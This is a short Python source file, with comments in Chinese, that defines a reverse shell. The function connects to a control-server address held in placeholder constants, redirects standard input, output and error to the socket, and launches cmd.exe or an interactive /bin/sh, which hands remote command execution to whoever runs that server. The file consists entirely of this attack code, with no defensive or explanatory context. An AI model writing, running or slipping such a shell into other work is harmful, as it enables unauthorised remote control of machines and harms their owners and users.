import os
import platform
import socket
import subprocess


def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((CONTROL_SERVER_IP, CONTROL_SERVER_PORT))

        # 重定向标准输入、输出、错误
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # 启动Shell (Windows下通常是cmd.exe, Linux下是/bin/sh)
        if platform.system() == "Windows":
            subprocess.call(["cmd.exe"])  # Windows
        else:
            subprocess.call(["/bin/sh", "-i"])  # Linux

    except Exception as e:
        print(f"创建shell异常：{e}")
